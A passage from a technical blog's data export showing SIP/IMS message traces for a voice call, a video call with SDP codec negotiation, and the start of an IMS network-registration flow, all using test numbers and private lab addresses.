101b=AS:41b=RR:1537b=RS:512a=rtpmap:107 AMR-WB/16000/1a=fmtp:107 mode-change-capability=2;max-red=0a=rtpmap:101 telephone-event/16000a=fmtp:101 0-15a=ptime:20a=maxptime:240a=sendrecva=curr:qos local sendrecva=curr:qos remote nonea=des:qos mandatory local sendrecva=des:qos mandatory remote sendrecv 2.7 200 OK12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455SIP/2.0 200 OKP-Access-Network-Info: 3GPP-NR-TDD;utran-cell-id-3gpp=4600000112207A123000Supported: 100rel,histinfo,join,norefersub,precondition,replaces,timerAllow: INVITE,ACK,OPTIONS,BYE,CANCEL,UPDATE,INFO,PRACK,NOTIFY,MESSAGE,REFERMin-SE: 90Require: precondition,timerUser-Agent: IM-client/OMA1.0 HW-Rto/V1.0Session-Expires: 1800;refresher=uasContent-Type: application/sdpVia: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKqyecbCEJ7GcqBMwaaW6Y;rport=5060From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=rvecbSkCall-ID: quecbSk9i@222.222.2.27To: &quot;8616500000062&quot; &lt;tel:+8616500000062&gt;;tag=464889803917CSeq: 3 UPDATEMax-Forwards: 70Contact: &lt;sip:+8616500000062@172.16.106.38:5060;transport=udp&gt;;+g.3gpp.icsi-ref=&quot;urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel&quot;;audio;video;+g.3gpp.mid-call;+g.3gpp.srvcc-alertingContent-Length: 467v=0o=rue 3219 3220 IN IP4 172.16.106.38s=-c=IN IP4 172.16.106.38b=AS:41b=RR:1537b=RS:512t=0 0m=audio 30052 RTP/AVP 107 101b=AS:41b=RR:1537b=RS:512a=rtpmap:107 AMR-WB/16000/1a=fmtp:107 mode-change-capability=2;max-red=0a=rtpmap:101 telephone-event/16000a=fmtp:101 0-15a=ptime:20a=maxptime:240a=sendrecva=curr:qos local sendrecva=curr:qos remote sendrecva=des:qos mandatory local sendrecva=des:qos mandatory remote sendrecvSIP/2.0 180 RingingP-Preferred-Identity: &lt;sip:+8616500000062@ims.mnc000.mcc000.3gppnetwork.org&gt;P-Access-Network-Info: 3GPP-NR-TDD;utran-cell-id-3gpp=4600000112207A123000Allow: INVITE,ACK,OPTIONS,BYE,CANCEL,UPDATE,INFO,PRACK,NOTIFY,MESSAGE,REFERUser-Agent: IM-client/OMA1.0 HW-Rto/V1.0Via: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKswecbCEJ7GcqBMwaay6Y;rport=5060From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=rvecbSkCall-ID: quecbSk9i@222.222.2.27To: &quot;8616500000062&quot; &lt;tel:+8616500000062&gt;;tag=464889803917CSeq: 1 INVITEMax-Forwards: 70Contact: &lt;sip:+8616500000062@172.16.106.38:5060;transport=udp&gt;;+g.3gpp.icsi-ref=&quot;urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel&quot;;audio;video;+g.3gpp.mid-call;+g.3gpp.srvcc-alertingSession-Expires: 1800Content-Length: 0 2.8 200 OK1234567891011121314151617SIP/2.0 200 OKP-Preferred-Identity: &lt;sip:+8616500000062@ims.mnc000.mcc000.3gppnetwork.org&gt;P-Access-Network-Info: 3GPP-NR-TDD;utran-cell-id-3gpp=4600000112207A123000Supported: 100rel,histinfo,join,norefersub,precondition,replaces,timerAllow: INVITE,ACK,OPTIONS,BYE,CANCEL,UPDATE,INFO,PRACK,NOTIFY,MESSAGE,REFERMin-SE: 90Require: timerUser-Agent: IM-client/OMA1.0 HW-Rto/V1.0Session-Expires: 1800;refresher=uasVia: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKswecbCEJ7GcqBMwaay6Y;rport=5060From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=rvecbSkCall-ID: quecbSk9i@222.222.2.27To: &quot;8616500000062&quot; &lt;tel:+8616500000062&gt;;tag=464889803917CSeq: 1 INVITEMax-Forwards: 70Contact: &lt;sip:+8616500000062@172.16.106.38:5060;transport=udp&gt;;+g.3gpp.icsi-ref=&quot;urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel&quot;;audio;video;+g.3gpp.mid-call;+g.3gpp.srvcc-alertingContent-Length: 0 2.9 ACK12345678910111213ACK sip:+8616500000062@172.16.106.38:5060;transport=udp SIP/2.0From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=rvecbSkTo: &quot;8616500000062&quot;&lt;tel:+8616500000062&gt;;tag=464889803917Contact: &lt;sip:+8616500000061@222.222.2.27:5060&gt;;+g.3gpp.icsi-ref=&quot;urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel&quot;Supported: 100rel,histinfo,join,norefersub,precondition,replaces,timer,sec-agreeRequire: sec-agreeProxy-Require: sec-agreeCall-ID: quecbSk9i@222.222.2.27CSeq: 1 ACKMax-Forwards: 70Via: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKrzecbCEJ7GcqBMwaaCcs;rportUser-Agent: IM-client/OMA1.0 HW-Rto/V1.0Content-Length: 0 2.10 200 OK12345678910SIP/2.0 200 OKServer: IM-Sever/OMA5.1Via: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKrzecbCEJ7GcqBMwaaCcs;rport=5060From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=rvecbSkCall-ID: quecbSk9i@222.222.2.27To: &quot;8616500000062&quot; &lt;tel:+8616500000062&gt;;tag=464889803917CSeq: 1 ACKMax-Forwards: 70Content-Length: 0 2.11 BYE123456789101112131415161718BYE sip:+8616500000061@222.222.2.27:5060 SIP/2.0Reason: SIP;cause=200;text=&quot;User term the call.&quot;P-Access-Network-Info: 3GPP-NR-TDD;utran-cell-id-3gpp=4600000112207A123000Supported: 100rel,histinfo,join,norefersub,precondition,replaces,timer,sec-agreeRequire: sec-agreeProxy-Require: sec-agreeUser-Agent: IM-client/OMA1.0 HW-Rto/V1.0Max-Forwards: 68CSeq: 1 BYECall-ID: quecbSk9i@222.222.2.27From: &quot;8616500000062&quot; &lt;tel:+8616500000062&gt;;tag=464889803917To: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=rvecbSkVia: SIP/2.0/UDP 172.16.106.38:5060;branch=z9hG4bK948fb923faf4;rport=54872Via: SIP/2.0/TCP 172.16.106.38:6060;branch=z9hG4bKe104ab646147;rport=59226Via: SIP/2.0/TCP 222.222.2.29:6070;branch=z9hG4bKIQecbQDRYGizsRqaayaZ;rport=41222;received=172.16.106.38Record-Route: &lt;sip:172.16.106.38:6060;transport=tcp;lr&gt;Record-Route: &lt;sip:172.16.106.38:6060;transport=tcp;lr&gt;Content-Length: 0 2.12 200 OK123456789101112SIP/2.0 200 OKFrom: &quot;8616500000062&quot;&lt;tel:+8616500000062&gt;;tag=464889803917To: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=rvecbSkCall-ID: quecbSk9i@222.222.2.27CSeq: 1 BYESupported: 100rel,histinfo,join,norefersub,precondition,replaces,timerP-Access-Network-Info: 3GPP-NR-TDD;utran-cell-id-3gpp=4600000112207A123000Via: SIP/2.0/UDP 172.16.106.38:5060;branch=z9hG4bK948fb923faf4;rport=5060Via: SIP/2.0/TCP 172.16.106.38:6060;branch=z9hG4bKe104ab646147;rport=59226Via: SIP/2.0/TCP 222.222.2.29:6070;branch=z9hG4bKIQecbQDRYGizsRqaayaZ;rport=41222;received=172.16.106.38User-Agent: IM-client/OMA1.0 HW-Rto/V1.0Content-Length: 0 3.视频通话3.1 INVITE12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879INVITE tel:+8616500000062 SIP/2.0From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=bjecbmOTo: &quot;8616500000062&quot;&lt;tel:+8616500000062&gt;P-Preferred-Identity: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;Contact: &lt;sip:+8616500000061@222.222.2.27:5060&gt;;+sip.instance=&quot;&lt;urn:gsma:imei:86354104-407800-0&gt;&quot;;+g.3gpp.icsi-ref=&quot;urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel&quot;;audio;video;+g.3gpp.mid-call;+g.3gpp.srvcc-alerting;+g.3gpp.ps2cs-srvcc-orig-pre-alertingAccept-Contact: *;+g.3gpp.icsi-ref=&quot;urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel&quot;;videoP-Access-Network-Info: 3GPP-NR-TDD;utran-cell-id-3gpp=4600000112207A123000P-Preferred-Service: urn:urn-7:3gpp-service.ims.icsi.mmtelP-Early-Media: supportedSupported: 100rel,histinfo,join,norefersub,precondition,replaces,timer,sec-agreeAllow: INVITE,ACK,OPTIONS,BYE,CANCEL,UPDATE,INFO,PRACK,NOTIFY,MESSAGE,REFERAccept: application/sdp,application/3gpp-ims+xmlSession-Expires: 1800Min-SE: 90Route: &lt;sip:172.16.106.38:5060;lr&gt;Require: sec-agreeProxy-Require: sec-agreeCall-ID: aiecbmOlo@222.222.2.27CSeq: 1 INVITEMax-Forwards: 70Via: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKckecbmOloqn5UNvaay6Y;rportUser-Agent: IM-client/OMA1.0 HW-Rto/V1.0Content-Type: application/sdpContent-Length: 1596v=0o=rue 3209 3209 IN IP4 222.222.2.27s=-c=IN IP4 222.222.2.27b=AS:1001b=RR:7537b=RS:8512t=0 0m=audio 31018 RTP/AVP 107 106 105 104 101 102b=AS:41b=RR:1537b=RS:512a=rtpmap:107 AMR-WB/16000/1a=fmtp:107 mode-change-capability=2;max-red=0a=rtpmap:106 AMR-WB/16000/1a=fmtp:106 octet-align=1;mode-change-capability=2;max-red=0a=rtpmap:105 AMR/8000/1a=fmtp:105 mode-change-capability=2;max-red=0a=rtpmap:104 AMR/8000/1a=fmtp:104 octet-align=1;mode-change-capability=2;max-red=0a=rtpmap:101 telephone-event/16000a=fmtp:101 0-15a=rtpmap:102 telephone-event/8000a=fmtp:102 0-15a=ptime:20a=maxptime:240a=sendrecva=curr:qos local nonea=curr:qos remote nonea=des:qos mandatory local sendrecva=des:qos optional remote sendrecvm=video 37058 RTP/AVP 120 123b=AS:960b=RR:6000b=RS:8000a=tcap:1 RTP/AVPFa=pcfg:1 t=1a=rtpmap:120 H265/90000a=fmtp:120 profile-id=1; level-id=93; max-br=1340a=imageattr:120 send [x=480,y=640] [x=360,y=480] [x=240,y=320] recv [x=480,y=640] [x=360,y=480] [x=240,y=320]a=rtpmap:123 H264/90000a=fmtp:123 profile-level-id=42C01F; packetization-mode=1; max-br=974; sprop-parameter-sets=Z0LAHtoHgUSAeEAhUA==,aM48gA==a=imageattr:123 send [x=480,y=640] [x=360,y=480] [x=240,y=320] recv [x=480,y=640] [x=360,y=480] [x=240,y=320]a=rtcp-fb:* trr-int 5000a=rtcp-fb:* nacka=rtcp-fb:* nack plia=rtcp-fb:* ccm fira=rtcp-fb:* ccm tmmbra=sendrecva=extmap:7 urn:3gpp:video-orientationa=curr:qos local nonea=curr:qos remote nonea=des:qos mandatory local sendrecva=des:qos optional remote sendrecv 3.2 100 Trying12345678SIP/2.0 100 TryingVia: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKckecbmOloqn5UNvaay6Y;rport=5060To: &quot;8616500000062&quot; &lt;tel:+8616500000062&gt;;tag=635653312983From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=bjecbmOCall-ID: aiecbmOlo@222.222.2.27CSeq: 1 INVITEServer: IM-Sever/OMA5.1Content-Length: 0 3.3 183 Session Progress1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162SIP/2.0 183 Session ProgressP-Preferred-Identity: &lt;sip:+8616500000062@ims.mnc000.mcc000.3gppnetwork.org&gt;P-Access-Network-Info: 3GPP-NR-TDD;utran-cell-id-3gpp=4600000112207A123000Allow: INVITE,ACK,OPTIONS,BYE,CANCEL,UPDATE,INFO,PRACK,NOTIFY,MESSAGE,REFERRequire: 100rel,preconditionUser-Agent: IM-client/OMA1.0 HW-Rto/V1.0Content-Type: application/sdpVia: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKckecbmOloqn5UNvaay6Y;rport=5060From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=bjecbmOCall-ID: aiecbmOlo@222.222.2.27To: &quot;8616500000062&quot; &lt;tel:+8616500000062&gt;;tag=635653312983CSeq: 1 INVITEMax-Forwards: 70Contact: &lt;sip:+8616500000062@172.16.106.38:5060;transport=udp&gt;;+g.3gpp.icsi-ref=&quot;urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel&quot;;audio;video;+g.3gpp.mid-call;+g.3gpp.srvcc-alertingSession-Expires: 1800RSeq: 1Content-Length: 1059v=0o=rue 3217 3217 IN IP4 172.16.106.38s=-c=IN IP4 172.16.106.38b=AS:1001b=RR:7537b=RS:8512t=0 0m=audio 30016 RTP/AVP 107 101b=AS:41b=RR:1537b=RS:512a=rtpmap:107 AMR-WB/16000/1a=fmtp:107 mode-change-capability=2;max-red=0a=rtpmap:101 telephone-event/16000a=fmtp:101 0-15a=ptime:20a=maxptime:240a=sendrecva=curr:qos local nonea=curr:qos remote nonea=des:qos mandatory local sendrecva=des:qos mandatory remote sendrecva=conf:qos remote sendrecvm=video 30018 RTP/AVPF 120b=AS:960b=RR:6000b=RS:8000a=acfg:1 t=1a=rtpmap:120 H265/90000a=fmtp:120 profile-id=1; level-id=93; max-br=974a=imageattr:120 send [x=480,y=640] [x=360,y=480] [x=240,y=320] recv [x=480,y=640] [x=360,y=480] [x=240,y=320]a=rtcp-fb:* trr-int 5000a=rtcp-fb:* nacka=rtcp-fb:* nack plia=rtcp-fb:* ccm fira=rtcp-fb:* ccm tmmbra=sendrecva=extmap:7 urn:3gpp:video-orientationa=curr:qos local nonea=curr:qos remote nonea=des:qos mandatory local sendrecva=des:qos mandatory remote sendrecva=conf:qos remote sendrecv 3.4 PRACK123456789101112PRACK sip:+8616500000062@172.16.106.38:5060;transport=udp SIP/2.0From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=bjecbmOTo: &quot;8616500000062&quot;&lt;tel:+8616500000062&gt;;tag=635653312983Call-ID: aiecbmOlo@222.222.2.27CSeq: 2 PRACKMax-Forwards: 70Supported: 100rel,histinfo,join,norefersub,precondition,replaces,timerP-Access-Network-Info: 3GPP-NR-TDD;utran-cell-id-3gpp=4600000112207A123000Via: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKdlecbSk9iWVQOxwaaq6Y;rportRAck: 1 1 INVITEUser-Agent: IM-client/OMA1.0 HW-Rto/V1.0Content-Length: 0 3.5 200 OK12345678SIP/2.0 200 OKVia: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKdlecbSk9iWVQOxwaaq6Y;rport=5060To: &quot;8616500000062&quot; &lt;tel:+8616500000062&gt;;tag=635653312983From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=bjecbmOCall-ID: aiecbmOlo@222.222.2.27CSeq: 2 PRACKServer: IM-Sever/OMA5.1Content-Length: 0 3.6 UPDATE12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758UPDATE sip:+8616500000062@172.16.106.38:5060;transport=udp SIP/2.0From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=bjecbmOTo: &quot;8616500000062&quot;&lt;tel:+8616500000062&gt;;tag=635653312983Contact: &lt;sip:+8616500000061@222.222.2.27:5060&gt;;+sip.instance=&quot;&lt;urn:gsma:imei:86354104-407800-0&gt;&quot;;+g.3gpp.icsi-ref=&quot;urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel&quot;;audio;video;+g.3gpp.mid-call;+g.3gpp.srvcc-alerting;+g.3gpp.ps2cs-srvcc-orig-pre-alertingP-Access-Network-Info: 3GPP-NR-TDD;utran-cell-id-3gpp=4600000112207A123000Supported: 100rel,histinfo,join,norefersub,precondition,replaces,timer,sec-agreeRequire: precondition,sec-agreeAllow: INVITE,ACK,OPTIONS,BYE,CANCEL,UPDATE,INFO,PRACK,NOTIFY,MESSAGE,REFERProxy-Require: sec-agreeCall-ID: aiecbmOlo@222.222.2.27CSeq: 3 UPDATEMax-Forwards: 70Via: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKamecbSk9iWVQOxwaaW6Y;rportUser-Agent: IM-client/OMA1.0 HW-Rto/V1.0Content-Type: application/sdpContent-Length: 995v=0o=rue 3209 3210 IN IP4 222.222.2.27s=-c=IN IP4 222.222.2.27b=AS:1001b=RR:7537b=RS:8512t=0 0m=audio 31018 RTP/AVP 107 101b=AS:41b=RR:1537b=RS:512a=rtpmap:107 AMR-WB/16000/1a=fmtp:107 mode-change-capability=2;max-red=0a=rtpmap:101 telephone-event/16000a=fmtp:101 0-15a=ptime:20a=maxptime:240a=sendrecva=curr:qos local sendrecva=curr:qos remote nonea=des:qos mandatory local sendrecva=des:qos mandatory remote sendrecvm=video 37058 RTP/AVPF 120b=AS:960b=RR:6000b=RS:8000a=rtpmap:120 H265/90000a=fmtp:120 profile-id=1; level-id=93; max-br=974a=imageattr:120 send [x=480,y=640] [x=360,y=480] [x=240,y=320] recv [x=480,y=640] [x=360,y=480] [x=240,y=320]a=rtcp-fb:* trr-int 5000a=rtcp-fb:* nacka=rtcp-fb:* nack plia=rtcp-fb:* ccm fira=rtcp-fb:* ccm tmmbra=sendrecva=extmap:7 urn:3gpp:video-orientationa=curr:qos local sendrecva=curr:qos remote nonea=des:qos mandatory local sendrecva=des:qos mandatory remote sendrecv 3.7 200 OK12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273SIP/2.0 200 OKP-Access-Network-Info: 3GPP-NR-TDD;utran-cell-id-3gpp=4600000112207A123000Supported: 100rel,histinfo,join,norefersub,precondition,replaces,timerAllow: INVITE,ACK,OPTIONS,BYE,CANCEL,UPDATE,INFO,PRACK,NOTIFY,MESSAGE,REFERMin-SE: 90Require: precondition,timerUser-Agent: IM-client/OMA1.0 HW-Rto/V1.0Session-Expires: 1800;refresher=uasContent-Type: application/sdpVia: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKamecbSk9iWVQOxwaaW6Y;rport=5060From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=bjecbmOCall-ID: aiecbmOlo@222.222.2.27To: &quot;8616500000062&quot; &lt;tel:+8616500000062&gt;;tag=635653312983CSeq: 3 UPDATEMax-Forwards: 70Contact: &lt;sip:+8616500000062@172.16.106.38:5060;transport=udp&gt;;+g.3gpp.icsi-ref=&quot;urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel&quot;;audio;video;+g.3gpp.mid-call;+g.3gpp.srvcc-alertingContent-Length: 1005v=0o=rue 3217 3218 IN IP4 172.16.106.38s=-c=IN IP4 172.16.106.38b=AS:1001b=RR:7537b=RS:8512t=0 0m=audio 30016 RTP/AVP 107 101b=AS:41b=RR:1537b=RS:512a=rtpmap:107 AMR-WB/16000/1a=fmtp:107 mode-change-capability=2;max-red=0a=rtpmap:101 telephone-event/16000a=fmtp:101 0-15a=ptime:20a=maxptime:240a=sendrecva=curr:qos local sendrecva=curr:qos remote sendrecva=des:qos mandatory local sendrecva=des:qos mandatory remote sendrecvm=video 30018 RTP/AVPF 120b=AS:960b=RR:6000b=RS:8000a=rtpmap:120 H265/90000a=fmtp:120 profile-id=1; level-id=93; max-br=974a=imageattr:120 send [x=480,y=640] [x=360,y=480] [x=240,y=320] recv [x=480,y=640] [x=360,y=480] [x=240,y=320]a=rtcp-fb:* trr-int 5000a=rtcp-fb:* nacka=rtcp-fb:* nack plia=rtcp-fb:* ccm fira=rtcp-fb:* ccm tmmbra=sendrecva=extmap:7 urn:3gpp:video-orientationa=curr:qos local sendrecva=curr:qos remote sendrecva=des:qos mandatory local sendrecva=des:qos mandatory remote sendrecvSIP/2.0 180 RingingP-Preferred-Identity: &lt;sip:+8616500000062@ims.mnc000.mcc000.3gppnetwork.org&gt;P-Access-Network-Info: 3GPP-NR-TDD;utran-cell-id-3gpp=4600000112207A123000Allow: INVITE,ACK,OPTIONS,BYE,CANCEL,UPDATE,INFO,PRACK,NOTIFY,MESSAGE,REFERUser-Agent: IM-client/OMA1.0 HW-Rto/V1.0Via: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKckecbmOloqn5UNvaay6Y;rport=5060From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=bjecbmOCall-ID: aiecbmOlo@222.222.2.27To: &quot;8616500000062&quot; &lt;tel:+8616500000062&gt;;tag=635653312983CSeq: 1 INVITEMax-Forwards: 70Contact: &lt;sip:+8616500000062@172.16.106.38:5060;transport=udp&gt;;+g.3gpp.icsi-ref=&quot;urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel&quot;;audio;video;+g.3gpp.mid-call;+g.3gpp.srvcc-alertingSession-Expires: 1800Content-Length: 0 3.8 200 OK1234567891011121314151617SIP/2.0 200 OKP-Preferred-Identity: &lt;sip:+8616500000062@ims.mnc000.mcc000.3gppnetwork.org&gt;P-Access-Network-Info: 3GPP-NR-TDD;utran-cell-id-3gpp=4600000112207A123000Supported: 100rel,histinfo,join,norefersub,precondition,replaces,timerAllow: INVITE,ACK,OPTIONS,BYE,CANCEL,UPDATE,INFO,PRACK,NOTIFY,MESSAGE,REFERMin-SE: 90Require: timerUser-Agent: IM-client/OMA1.0 HW-Rto/V1.0Session-Expires: 1800;refresher=uasVia: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKckecbmOloqn5UNvaay6Y;rport=5060From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=bjecbmOCall-ID: aiecbmOlo@222.222.2.27To: &quot;8616500000062&quot; &lt;tel:+8616500000062&gt;;tag=635653312983CSeq: 1 INVITEMax-Forwards: 70Contact: &lt;sip:+8616500000062@172.16.106.38:5060;transport=udp&gt;;+g.3gpp.icsi-ref=&quot;urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel&quot;;audio;video;+g.3gpp.mid-call;+g.3gpp.srvcc-alertingContent-Length: 0 3.9 ACK12345678910111213ACK sip:+8616500000062@172.16.106.38:5060;transport=udp SIP/2.0From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=bjecbmOTo: &quot;8616500000062&quot;&lt;tel:+8616500000062&gt;;tag=635653312983Contact: &lt;sip:+8616500000061@222.222.2.27:5060&gt;;+g.3gpp.icsi-ref=&quot;urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel&quot;Supported: 100rel,histinfo,join,norefersub,precondition,replaces,timer,sec-agreeRequire: sec-agreeProxy-Require: sec-agreeCall-ID: aiecbmOlo@222.222.2.27CSeq: 1 ACKMax-Forwards: 70Via: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKbnecbSk9iWVQOxwaaCcs;rportUser-Agent: IM-client/OMA1.0 HW-Rto/V1.0Content-Length: 0 3.10 200 OK123456789SIP/2.0 200 OKServer: IM-Sever/OMA5.1Via: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKbnecbSk9iWVQOxwaaCcs;rport=5060From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=bjecbmOCall-ID: aiecbmOlo@222.222.2.27To: &quot;8616500000062&quot; &lt;tel:+8616500000062&gt;;tag=635653312983CSeq: 1 ACKMax-Forwards: 70Content-Length: 0 3.11 BYE123456789101112131415161718BYE sip:+8616500000061@222.222.2.27:5060 SIP/2.0Reason: SIP;cause=200;text=&quot;User term the call.&quot;P-Access-Network-Info: 3GPP-NR-TDD;utran-cell-id-3gpp=4600000112207A123000Supported: 100rel,histinfo,join,norefersub,precondition,replaces,timer,sec-agreeRequire: sec-agreeProxy-Require: sec-agreeUser-Agent: IM-client/OMA1.0 HW-Rto/V1.0Max-Forwards: 68CSeq: 1 BYECall-ID: aiecbmOlo@222.222.2.27From: &quot;8616500000062&quot; &lt;tel:+8616500000062&gt;;tag=635653312983To: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=bjecbmOVia: SIP/2.0/UDP 172.16.106.38:5060;branch=z9hG4bK8390bf49a6da;rport=54872Via: SIP/2.0/TCP 172.16.106.38:6060;branch=z9hG4bK0e2a771d7b17;rport=59226Via: SIP/2.0/TCP 222.222.2.29:6070;branch=z9hG4bKIMecbQDRYGizsRqaayaZ;rport=41222;received=172.16.106.38Record-Route: &lt;sip:172.16.106.38:6060;transport=tcp;lr&gt;Record-Route: &lt;sip:172.16.106.38:6060;transport=tcp;lr&gt;Content-Length: 0 3.12 200 OK12345678910111213SIP/2.0 200 OKFrom: &quot;8616500000062&quot;&lt;tel:+8616500000062&gt;;tag=635653312983To: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=bjecbmOCall-ID: aiecbmOlo@222.222.2.27CSeq: 1 BYESupported: 100rel,histinfo,join,norefersub,precondition,replaces,timerP-Access-Network-Info: 3GPP-NR-TDD;utran-cell-id-3gpp=4600000112207A123000Via: SIP/2.0/UDP 172.16.106.38:5060;branch=z9hG4bK8390bf49a6da;rport=5060Via: SIP/2.0/TCP 172.16.106.38:6060;branch=z9hG4bK0e2a771d7b17;rport=59226Via: SIP/2.0/TCP 222.222.2.29:6070;branch=z9hG4bKIMecbQDRYGizsRqaayaZ;rport=41222;received=172.16.106.38User-Agent: IM-client/OMA1.0 HW-Rto/V1.0Content-Length: 0","categories":[{"name":"SIP","slug":"SIP","permalink":"https://wuhaocn.github.io/categories/SIP/"}],"tags":[{"name":"IMS","slug":"IMS","permalink":"https://wuhaocn.github.io/tags/IMS/"}]},{"title":"IMS-入网注册","slug":"network/protocol/sip/IMS-入网注册","date":"2023-11-15T03:40:25.014Z","updated":"2023-11-15T03:40:25.015Z","comments":true,"path":"2023/11/15/network/protocol/sip/IMS-入网注册/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/network/protocol/sip/IMS-%E5%85%A5%E7%BD%91%E6%B3%A8%E5%86%8C/","excerpt":"","text":"1.概要 2.registerREGISTER sip:ims.mnc000.mcc000.3gppnetwork.org SIP/2.0Contact: sip:460003911000057@172.16.106.92;+g.3gpp.icsi-ref=”urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel”;+g.3gpp.ics=”principal”Authorization: Digest username=”&#56;&#54;&#x31;&#x33;&#x39;&#x31;&#x31;&#48;&#48;&#x30;&#48;&#x35;&#x37;&#x40;&#x69;&#x6d;&#x73;&#46;&#x6d;&#110;&#99;&#48;&#x30;&#48;&#46;&#x6d;&#x63;&#x63;&#48;&#x30;&#48;&#x2e;&#x33;&#103;&#x70;&#112;&#x6e;&#101;&#116;&#119;&#x6f;&#x72;&#x6b;&#46;&#111;&#114;&#103;“,realm=”ims.mnc000.mcc000.3gppnetwork.org”,nonce=””,uri=”sip:ims.mnc000.mcc000.3gppnetwork.org”,response=””,integrity-protected=”no”Expires: 600000Supported: sec-agree,pathCSeq: 1 REGISTERCall-ID: &#x32;&#x39;&#x39;&#x30;&#54;&#64;&#x31;&#x37;&#50;&#46;&#49;&#x36;&#x2e;&#x31;&#x30;&#54;&#x2e;&#x39;&#50;From: sip:460003911000057@ims.mnc000.mcc000.3gppnetwork.org;tag=3196215To: sip:460003911000057@ims.mnc000.mcc000.3gppnetwork.orgP-Visited-Network-ID: “sip:&#x70;&#99;&#x73;&#x63;&#x66;&#64;&#x31;&#55;&#x32;&#x2e;&#49;&#54;&#46;&#49;&#48;&#x36;&#46;&#56;&#x31;:6070”Feature-Caps: *;+g.3gpp.atcf=”tel:+12340000000“;+g.3gpp.atcf-mgmt-uri=”sip:172.16.106.81:6070“;+g.3gpp.atcf-path=”sip:pcscf@172.16.106.81:6070;transport=udp;lr“;+g.3gpp.mid-call;+g.3gpp.srvcc-alertingP-Track-ID: c98ce46bbb951afc2305297a67Route: sip:proxy@172.16.106.94:5060;lr;transport=udpService-Route: sip:172.16.106.95:5060;transport=udp;lrPath: sip:172.16.106.81:6070;transport=udp;lr;key=a02907193feadf0b3e14932b37P-UserAgent-Info: sip:172.16.106.92:5060;transport=udp;+sbc.address=”sip:172.16.106.81:5060;lr;transport=udp“Via: SIP/2.0/UDP 172.16.106.81:6070;branch=z9hG4bK19fae5599197Via: SIP/2.0/UDP 172.16.106.92:5060;branch=z9hG4bK57ab028-c4e752e3P-Access-Network-Info: 3GPP-NR-TDD; sip:172.16.106.81:5060;lr;transport=udp;ue-ip=172.16.106.92;ue-port=5060;raw-ip=172.16.106.92;raw-port=5060Require: pathP-Charging-Vector: icid-value=2cd85e11b34b4fe68c4d8c698938d022;icid-generated-at=pcscf.visited.net;orig-ioi=visited.netMax-Forwards: 69Content-Length: 0 3.401 UnauthorizedSIP/2.0 401 UnauthorizedVia: SIP/2.0/UDP 172.16.106.81:6070;branch=z9hG4bK19fae5599197Via: SIP/2.0/UDP 172.16.106.92:5060;branch=z9hG4bK57ab028-c4e752e3From: sip:460003911000057@ims.mnc000.mcc000.3gppnetwork.org;tag=3196215To: sip:460003911000057@ims.mnc000.mcc000.3gppnetwork.org;tag=228495176Call-ID: 